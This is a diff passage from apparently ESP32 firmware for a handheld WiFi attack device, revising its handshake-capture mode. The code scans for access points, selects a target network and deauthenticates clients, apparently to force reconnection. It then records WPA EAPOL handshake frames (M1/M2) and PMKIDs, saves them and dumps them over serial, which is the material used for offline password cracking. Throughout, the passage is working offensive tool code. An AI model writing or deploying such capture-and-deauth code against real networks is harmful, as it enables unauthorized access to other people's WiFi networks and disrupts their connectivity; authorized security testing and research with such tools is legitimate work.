+    memset(capturedStaMac, 0, sizeof(capturedStaMac));
     captureActive = false;
     scanInProgress = false;
     deauthStopped = false;
     for (int i = 0; i < CANDIDATE_SLOTS; i++) candidateReady[i] = false;
     candWrite = 0;
     candRead = 0;
-    memset(capturedPmkid, 0, sizeof(capturedPmkid));
-
     needsRedraw = true;
     lastMode = HS_MODE_MENU;
     lastMenuSelection = -1;
@@ -693,24 +985,36 @@ void handshakeCaptureSetup() {
     lastGotM1 = false;
     lastGotM2 = false;
     lastScanCount = 0;
+    lastScanUpdate = 0;
+    lastUiTick = 0;
 }
 
 void handshakeCaptureLoop() {
     updateLastActivity();
     unsigned long now = millis();
 
+    // ---- Scanning: early return (matches original control flow) ----
     if (currentMode == HS_MODE_SCANNING) {
-        esp_wifi_scan_get_ap_num(&currentScanCount);
-        if (currentScanCount != lastScanCount || now - lastScanUpdate >= 100) {
-            lastScanCount = currentScanCount;
+        uint16_t n = 0;
+        esp_wifi_scan_get_ap_num(&n);
+        if (n != currentScanCount || now - lastScanUpdate >= 100) {
+            currentScanCount = n;
+            lastScanCount = n;
             lastScanUpdate = now;
             needsRedraw = true;
         }
-        if (needsRedraw) { drawScanning(); needsRedraw = false; }
-        if (now - scanStartTime > SCAN_DURATION) processScanResults();
+        if (needsRedraw) {
+            drawScanning();
+            needsRedraw = false;
+        }
+        if (now - scanStartTime >= SCAN_DURATION) {
+            esp_wifi_scan_stop();
+            processScanResults();
+        }
         return;
     }
 
+    // ---- Saved message: early return, then back to AP list ----
     if (currentMode == HS_MODE_SAVED_MSG) {
         if (now >= savedMsgUntil) {
             currentMode = HS_MODE_LIST;
@@ -722,25 +1026,37 @@ void handshakeCaptureLoop() {
         return;
     }
 
-    if (captureActive) processCandidates();
+    if (captureActive) {
+        processCandidates();
+    }
 
-    bool up    = digitalRead(BTN_UP) == LOW;
-    bool down  = digitalRead(BTN_DOWN) == LOW;
-    bool left  = digitalRead(BTN_BACK) == LOW;
+    // Periodic UI tick during capture so elapsed time updates
+    if (currentMode == HS_MODE_CAPTURE && (now - lastUiTick > 500)) {
+        lastUiTick = now;
+        needsRedraw = true;
+    }
+
+    bool up    = digitalRead(BTN_UP)    == LOW;
+    bool down  = digitalRead(BTN_DOWN)  == LOW;
     bool right = digitalRead(BTN_RIGHT) == LOW;
+    bool left  = digitalRead(BTN_BACK)  == LOW;
 
     switch (currentMode) {
     case HS_MODE_MENU:
         if (up || down) { menuSelection ^= 1; needsRedraw = true; delay(180); }
         if (right) {
             if (menuSelection == 0) startScan();
-            else { currentMode = HS_MODE_VIEW_LIST; viewIndex = 0; needsRedraw = true; }
+            else {
+                currentMode = HS_MODE_VIEW_LIST;
+                viewIndex = 0;
+                needsRedraw = true;
+            }
             delay(180);
         }
         break;
 
     case HS_MODE_LIST:
-        if (up && apCount) { apIndex = (apIndex - 1 + apCount) % apCount; needsRedraw = true; delay(180); }
+        if (up && apCount)   { apIndex = (apIndex - 1 + apCount) % apCount; needsRedraw = true; delay(180); }
         if (down && apCount) { apIndex = (apIndex + 1) % apCount; needsRedraw = true; delay(180); }
         if (right && apCount) {
             strncpy(targetSsid, apList[apIndex].ssid, sizeof(targetSsid) - 1);
@@ -753,12 +1069,23 @@ void handshakeCaptureLoop() {
             gotM1 = false;
             gotM2 = false;
             bestSnapLen = 0;
+            snapFromPmkid = false;
+            frameM1Len = 0;
+            frameM2Len = 0;
+            framePmkidSrcLen = 0;
             deauthStopped = false;
+            eapolDropped = 0;
+            haveStaMac = false;
             for (int i = 0; i < CANDIDATE_SLOTS; i++) candidateReady[i] = false;
             candWrite = 0;
             candRead = 0;
             memset(capturedPmkid, 0, sizeof(capturedPmkid));
             memset(bestSnap, 0, sizeof(bestSnap));
+            memset(frameM1, 0, sizeof(frameM1));
+            memset(frameM2, 0, sizeof(frameM2));
+            memset(framePmkidSrc, 0, sizeof(framePmkidSrc));
+            memset(m1ReplayCounter, 0, sizeof(m1ReplayCounter));
+            memset(capturedStaMac, 0, sizeof(capturedStaMac));
 
             initWiFi(WIFI_MODE_APSTA);
             delay(30);
@@ -773,6 +1100,7 @@ void handshakeCaptureLoop() {
             currentMode = HS_MODE_CAPTURE;
             captureStartTime = now;
             lastDeauthTime = 0;
+            lastUiTick = now;
             needsRedraw = true;
             delay(180);
         }
@@ -782,27 +1110,11 @@ void handshakeCaptureLoop() {
     case HS_MODE_CAPTURE: {
         if (left) {
             stopCaptureRadio();
+            processCandidates();  // drain any last frames
             if (eapolCount > 0) {
                 hsSaveCurrentCapture();
-                // Dump to serial immediately
-                HandshakeEntry tmp;
-                // Re-read last written roughly via current state for serial
-                Serial.println(F("\n=== Capture saved ==="));
-                Serial.printf("SSID: %s\n", targetSsid);
-                Serial.printf("BSSID: %02X:%02X:%02X:%02X:%02X:%02X  Ch:%u\n",
-                              targetBssid[0], targetBssid[1], targetBssid[2],
-                              targetBssid[3], targetBssid[4], targetBssid[5],
-                              targetChannel);
-                Serial.printf("EAPOL: %u  M1:%s M2:%s PMKID:%s\n",
-                              (unsigned)eapolCount,
-                              gotM1 ? "Y" : "N", gotM2 ? "Y" : "N",
-                              hasPmkid ? "Y" : "N");
-                if (hasPmkid) {
-                    Serial.print("PMKID: ");
-                    for (int i = 0; i < 16; i++) Serial.printf("%02x", capturedPmkid[i]);
-                    Serial.println();
-                }
-                savedMsgUntil = now + 1500;
+                serialDumpLiveCapture();
+                savedMsgUntil = now + 1800;
                 currentMode = HS_MODE_SAVED_MSG;
             } else {
                 currentMode = HS_MODE_LIST;
@@ -814,11 +1126,15 @@ void handshakeCaptureLoop() {
 
         if (now - captureStartTime > AUTO_STOP_MS) {
             stopCaptureRadio();
+            processCandidates();
             if (eapolCount > 0) {
                 hsSaveCurrentCapture();
-                savedMsgUntil = now + 1500;
+                serialDumpLiveCapture();
+                savedMsgUntil = now + 1800;
                 currentMode = HS_MODE_SAVED_MSG;
-            } else currentMode = HS_MODE_LIST;
+            } else {
+                currentMode = HS_MODE_LIST;
+            }
             needsRedraw = true;
             break;
         }
@@ -853,7 +1169,6 @@ void handshakeCaptureLoop() {
         if (down && count) { viewIndex = (viewIndex + 1) % count; needsRedraw = true; delay(180); }
         if (right && count) {
             currentMode = HS_MODE_VIEW_DETAIL;
-            // Dump to serial when opening detail
             HandshakeEntry e;
             hsReadEntry(viewIndex, e);
             serialDumpEntry(e, viewIndex);
@@ -886,6 +1201,7 @@ void handshakeCaptureLoop() {
     if (needsRedraw) {
         switch (currentMode) {
         case HS_MODE_MENU:        drawMenu(); break;
+        case HS_MODE_SCANNING:    drawScanning(); break;
         case HS_MODE_LIST:        drawList(); break;
         case HS_MODE_CAPTURE:     drawCapture(); break;
         case HS_MODE_VIEW_LIST:   drawViewList(); break;
